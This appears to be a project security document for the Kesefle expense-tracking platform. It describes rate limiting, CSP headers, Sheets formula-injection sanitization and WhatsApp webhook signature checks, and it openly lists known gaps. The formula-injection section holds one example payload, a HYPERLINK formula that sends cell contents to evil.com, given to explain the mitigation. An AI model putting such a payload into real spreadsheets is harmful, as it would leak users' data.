# Kesefle Security

## Overview

This document captures the operational security posture for the Kesefle platform — the
Vercel serverless API, the Apps Script bot, and the data they share via Vercel KV
(Upstash Redis). It complements the deeper material in `docs/security/`.

The threat model assumes an attacker who can: (a) send arbitrary requests to public
endpoints, (b) send arbitrary WhatsApp messages to the bot number, and (c) read any
data the user themselves writes back to their own Google Sheet. Out of scope: a
compromised Vercel project secret store, a compromised Google account.

## Vercel KV token scope

The Vercel KV token must be restricted to the following key prefixes:

- `rate:*`
- `token:*`
- `family:*`
- `sub:*`
- `phone:*`

Permissions: `GET`, `SET`, `DEL`, `INCR`, `EXPIRE`.

If Upstash adds prefix-scoped tokens, the production token must be replaced with one
that holds only those scopes. The current token is full-access; this is tracked as a
follow-up. Until then, treat the KV token as a tier-1 secret on par with
`GOOGLE_CLIENT_SECRET`.

## Rate limiting

Two layers run in front of public endpoints:

1. **Inline per-IP guard** — `api/_lib/rateLimit.js` extracts the client IP from
   `x-forwarded-for` (first hop) or `x-real-ip`, increments `rate:<ip>` in KV with a
   60-second TTL, and returns a 429 if the count exceeds 30 in that window. Skipped
   for `/api/health` and `/api/_internal*`. Fails open on KV outage so an Upstash
   incident does not cause a site-wide outage.
2. **Per-endpoint, per-action wrapper** — `lib/ratelimit.js` is used by routes that
   need finer-grained control (e.g. 10 OAuth code exchanges per IP per hour, 5 sheet
   provisions per user per hour). Both layers coexist; the inline guard is the cheap
   first line, the wrapper layer expresses business-rule limits.

Currently applied inline on: `api/auth/google.js`, `api/events.js`. Apply to any new
public endpoint by importing `rateLimit` from `../_lib/rateLimit.js` (or as many `..`
hops as required) and calling `if (await rateLimit(req, res)) return;` as the first
line of the handler.

## CSP

The site-wide Content Security Policy is set in `vercel.json` under the global
`/(.*)` headers block. The policy intentionally allows the following remote origins:

- `script-src`: `https://apis.google.com` (Google Identity Services, Picker),
  `https://cdn.jsdelivr.net` (libraries), `https://cdn.tailwindcss.com` (utility CSS
  runtime), `https://accounts.google.com` (OAuth chooser), plus
  `https://connect.facebook.net` and `https://appleid.cdn-apple.com` for the social
  sign-in scripts on `/account`.
- `style-src`: `https://fonts.googleapis.com`, `https://cdn.jsdelivr.net`,
  `https://cdn.tailwindcss.com`. `'unsafe-inline'` is required because the site uses
  inline `style="..."` attributes throughout the marketing pages and Tailwind's
  runtime injects inline `<style>` blocks.
- `connect-src`: `https://sheets.googleapis.com`, `https://oauth2.googleapis.com`,
  `https://accounts.google.com`, `https://www.googleapis.com`. The first two are the
  only ones the dashboard actually calls; the second two are Google's broader OAuth
  surface.
- `frame-src`: `https://accounts.google.com` only.
- `frame-ancestors 'none'` — Kesefle pages can never be embedded.

Headers set alongside the CSP: `X-Frame-Options: DENY`,
`X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`,
`Permissions-Policy: camera=(), microphone=(), geolocation=(), interest-cohort=()`,
`Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`.

`'unsafe-inline'` for scripts is a known weakening. Removing it would require auditing
every inline `<script>` block on every page and either externalizing or nonce-ing
them. Tracked as a follow-up.

## Formula injection

The bot writes user-supplied text into Google Sheets. Sheets evaluates any cell whose
value begins with `=`, `+`, `-`, `@`, or a tab character as a formula. A
maliciously-crafted WhatsApp message like `=HYPERLINK("https://evil.com?d="&A1, "click")`
would, if written raw, exfiltrate adjacent cells the first time the sheet is opened.

Mitigation: every user-typed string passes through `sanitizeForSheet()` (defined near
the top of `bot/ExpenseBot_FIXED.gs`) before it lands in `appendRow()` / `setValue()`
/ `setValues()`. The helper prepends a single quote `'` if the first character is one
of the dangerous five; non-strings (numbers, dates, booleans) pass through untouched
because they never go through formula parsing.

Applied at all write sites in `ExpenseBot_FIXED.gs`:
- `processExpense()` and the interactive-reply path (description, category, subcategory).
- `_learnedSave()` (learned keyword + category mappings).
- `migrateLegacyDashboardValues()` (section names and labels read from the
  pre-existing dashboard).
- `migrateSubcategoriesAndCategories()` (cells being rewritten in-place).

Static header rows like `['keyword', 'category', 'subcategory', 'source',
'updated_at']` are not sanitized because they are compile-time literals.

## WhatsApp webhook authenticity

The bot's `doPost` web app at `/exec` is publicly reachable — anyone with the
URL can POST. Meta signs every legitimate Cloud-API webhook with HMAC-SHA256
over the raw body using the App Secret as the key, and ships the digest in the
`X-Hub-Signature-256: sha256=<hex>` header. Without verification, an attacker
could forge messages from any phone number into the user's sheet.

Two layers run in `bot/ExpenseBot_FIXED.gs` at the very top of `doPost`:

1. **`_verifyMetaWebhook_(e, rawBody)`** — runs before JSON parsing.
   - Computes `HMAC-SHA256(rawBody, META_APP_SECRET)` via
     `Utilities.computeHmacSha256Signature` and compares (length-checked,
     constant-time-ish byte-XOR) against the `sha256=` prefix from the
     `X-Hub-Signature-256` header.
   - Also asserts `entry[0].id` equals `WHATSAPP_BUSINESS_ACCOUNT_ID` (the
     WABA id Script Property). This filters spam even when full HMAC is
     unavailable.
   - Returns `{valid, reason}`. On rejection we log the reason and return
     `200 OK` so Meta does not retry the forged delivery, but skip all
     downstream processing.

2. **`_isRateLimited_(fromPhone)`** — silent drop when one phone sends more
   than **30 messages per 60 seconds**. Backed by `CacheService`
   (`rateLimit:<phone>` key, 60s TTL). Fails open if cache I/O breaks so a
   CacheService outage doesn't block legitimate users.

### Apps Script limitation

Apps Script's standard web-app `doPost(e)` has historically **not** exposed
request headers. The runtime strips them before invoking user code. The
verifier probes three possible locations (`e.headers`, `e.parameter`,
`e.postData.headers`) so it will start working the day Google ships header
access, but today HMAC verification is typically a no-op inside Apps Script
itself. When that happens we log `Webhook HMAC skipped: ...` and rely on the
WABA-id secondary check plus per-phone rate limiting.

### Production hardening: Vercel proxy

For full signature verification today, the recommended production pattern is
to insert a Vercel function between Meta and Apps Script:

1. Meta sends the webhook to `https://kesefle.vercel.app/api/whatsapp-webhook`.
2. The Vercel function verifies `X-Hub-Signature-256` with
   `META_APP_SECRET` (Node's `crypto.createHmac('sha256', secret)`).
3. On valid signature, it forwards the body to the Apps Script `/exec` URL
   with an `Authorization: Bearer <SHARED_PROXY_TOKEN>` header.
4. Apps Script `doPost` checks the bearer token (Script Property
   `PROXY_BEARER_TOKEN`) and only then processes the message.

This pattern is *not* wired up today — it requires a new Vercel route and a
shared secret. The existing in-script verifier is the graceful-degradation
path until then.

### Script Properties

| Property | Required | Effect when unset |
|---|---|---|
| `META_APP_SECRET` | Recommended | HMAC check is skipped (logged). |
| `WHATSAPP_BUSINESS_ACCOUNT_ID` | Recommended | WABA-id check is skipped. |
| `STRICT_WEBHOOK_VERIFY` | Optional (`"1"` to enable) | When `"1"`, reject if HMAC cannot run (no secret, no header). Default off for backward compat. |
| `PROXY_BEARER_TOKEN` | Future (proxy pattern) | Not consumed yet. |

### What this provides — and what it doesn't

- **Provides today:** rejection of payloads whose WABA id doesn't match,
  silent drop of per-phone spam, full HMAC verification *if/when* Apps
  Script exposes the signature header (or once the Vercel proxy is wired).
- **Does NOT provide today:** cryptographic proof of Meta origin inside Apps
  Script alone. An attacker who guesses the `/exec` URL and a legitimate
  WABA id can still POST forged payloads at up to 30 msgs/min/phone. The
  WABA id is *not* secret (it's visible in webhook payloads to anyone who
  has ever received one), so this is real but partial protection.

